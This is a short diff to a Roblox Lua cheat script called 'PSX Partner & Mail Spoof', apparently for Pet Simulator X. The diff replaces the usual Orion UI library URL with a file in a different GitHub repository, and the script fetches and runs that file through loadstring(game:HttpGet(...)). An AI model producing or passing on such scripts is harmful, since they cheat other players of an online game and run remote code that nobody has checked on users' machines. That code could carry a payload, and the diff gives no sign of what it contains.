@@ -1,4 +1,4 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/FantaroX/partnermailspoof/main/libs')))()
 getgenv().Username = "Boxking776Femboy"
 OrionLib:MakeNotification({
 	Name = "PSX Partner & Mail Spoof",
